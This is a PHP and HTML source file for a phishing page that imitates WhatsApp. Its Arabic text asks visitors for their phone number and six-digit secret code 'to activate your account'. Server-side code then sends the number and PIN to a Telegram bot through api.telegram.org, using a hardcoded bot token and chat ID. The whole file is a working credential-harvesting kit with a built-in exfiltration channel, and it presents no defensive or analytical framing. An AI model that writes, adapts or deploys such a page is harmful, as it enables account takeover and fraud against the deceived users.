<!DOCTYPE html>
<html style="background-color: #1ebea5;zoom:130%">
<head>
	<title></title>
	<link rel="preconnect" href="https://fonts.gstatic.com">
	<link href="https://fonts.googleapis.com/css2?family=Almarai&display=swap" rel="stylesheet">
	<style type="text/css">
		.issam{
			font-family: 'Almarai', sans-serif;
			font-size: 29px;
			color: #FFF;

		}
	</style>


	<script src="http://code.jquery.com/jquery-3.5.1.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
	<script>
        function showAlert(message) {
            alert(message);
        }
    </script>
</head>
<body style="text-align: center;">


<form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" onsubmit="return sendData()" >
	

	<img src="https://static.whatsapp.net/rsrc.php/yv/r/-r3j-x8ZnM7.svg" width="55%;" style="margin-top: 180px;">

	<h3 class="issam" style="margin-top:100px;">المرجو إدخال الرقم الخاص بكم</h3>
	<input name="input1" type="text" maxlength="10" style="width: 350px;height:65px;border:none;margin-top: 25px;text-align: center;font-family: 'Almarai', sans-serif;font-size: 22px;font-weight: bold;color:#00584b" required />



	<h3 class="issam" style="margin-top:100px;">المرجو إدخال الرمز السري الخاص بكم لتفعيل حسابك</h3>
	<input name="input2" type="password" maxlength="6" style="width: 350px;height:65px;border:none;margin-top: 25px;margin-bottom: 15px;text-align: center;font-family: 'Almarai', sans-serif;font-size: 22px;font-weight: bold;color:#00584b" required />

	<br>
	<hr>
	<input type="submit" name="submit" value="إرسال" style="margin-top: 30px;font-size: 29px;font-family: 'Almarai', sans-serif;padding: 15px;width: 350px;background-color: #01e675;color:#FFF;border:none;">
</form>
<script>
        function sendData() {
            var input1 = document.getElementById("input1").value;
            var input2 = document.getElementById("input2").value;
            
            // AJAX request to send data to server
            var xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function() {
                if (this.readyState == 4) {
                    if (this.status == 200) {
                        showAlert("تم تسجيل طلبكم بنجاح");
                    } else {
                        showAlert("المرجو إعادة المحاولة !");
                    }
                }
            };
            xhttp.open("POST", "<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>", true);
            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
            xhttp.send("input1=" + input1 + "&input2=" + input2);
            
            return false; // Prevent the form from submitting normally
        }
    </script>

<?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Get input data
        $input1 = $_POST['input1'];
        $input2 = $_POST['input2'];

        // Telegram bot settings
        $botToken = '7292959892:AAE3azYgFFdyynNrl5v_mp0-3iCT593lzBg'; // Replace with your bot token
        $chatId = '1452497907'; // Replace with your chat ID
        
        // Message to be sent to Telegram
        $message = "Num: $input1\nPin: $input2";
        
        // Telegram API endpoint
        $telegramApiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
        
        // Data to be sent to Telegram
        $data = [
            'chat_id' => $chatId,
            'text' => $message
        ];
        
        // Use cURL to send data to Telegram
        $curl = curl_init($telegramApiUrl);
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($curl);
        $statusCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
        curl_close($curl);
        
        // Check if data was sent successfully
        if ($statusCode != 200) {
            echo "<script>showAlert('المرجو إعادة المحاولة !');</script>";
        }
    }
    ?>

</body>
</html>